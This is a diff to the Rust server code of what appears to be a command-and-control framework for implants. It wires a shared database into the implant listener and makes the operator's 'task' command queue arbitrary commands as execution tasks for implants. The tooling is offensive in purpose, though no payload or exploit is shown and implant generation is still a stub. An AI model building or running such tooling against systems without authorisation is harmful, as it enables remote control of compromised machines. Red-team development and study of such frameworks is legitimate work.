@@ -1,10 +1,12 @@
+use std::sync::Arc;
+
 use clap::Parser;
 use super::Server;
 use super::net::{implant_server, operator_server};
-use crate::share::{Console, Commands, Error, parsers};
+use crate::share::{Console, Commander, Error, parsers};
 
 // General purpose commands for the server
-impl Commands for Server {
+impl Commander for Server {
     // TODO: Generate implants
     fn generate(&self, parser: parsers::Generate) -> Result<(), Error> {
         println!("{:?}", parser);
@@ -18,7 +20,7 @@ impl Commands for Server {
                 let ip = lhost.parse()
                     .map_err(|_| Error::InvalidIP(lhost.to_string()))?;
                 let addr = std::net::SocketAddr::new(ip, *lport);
-                let listener = implant_server::Listener::new(addr);
+                let listener = implant_server::Listener::new(addr, Arc::clone(&self.db));
                 match listener.start_listener() {
                     Ok(_) => println!("Started listener at {}:{}", lhost, lport),
                     Err(err) => eprintln!("Error, could not start listener on {}:{}\n{:?}", lhost, lport, err)
@@ -37,17 +39,23 @@ impl Commands for Server {
     }
 
     fn task(&mut self, parser: parsers::Task) -> Result<(), Error> {
-        let listener = self.listeners.get_mut(&parser.listener)
-            .ok_or_else(|| Error::ListenerNotExist(parser.listener.clone()))?;
+        // let listener = self.listeners.get_mut(&parser.listener)
+            // .ok_or_else(|| Error::ListenerNotExist(parser.listener.clone()))?;
 
-        let mut task = listener.tasks.lock()
-            .map_err(|_| {
-                let name = format!("listener {}", parser.listener.clone());
-                Error::LockMutex(name)
-            })?;
+        // let mut task = listener.db.lock()
+        //     .map_err(|_| {
+        //         let name = format!("listener {}", parser.listener.clone());
+        //         Error::LockMutex(name)
+        //     })?;
+        futures::executor::block_on(self.db.add_task(super::db::entities::tasks::Model {
+            uuid: uuid::Uuid::new_v4(),
+            ttype: crate::share::implantpb::TaskType::ExecTask as i32,
+            payload: Some(parser.cmd.clone())
+        }))
+        .map_err(|e| Error::DatabaseErr(e))?;
 
         println!("Added `{}` to tasks", parser.cmd);
-        task.insert(0, parser.cmd);
+        // task.insert(0, parser.cmd);
         Ok(())
     }
 }
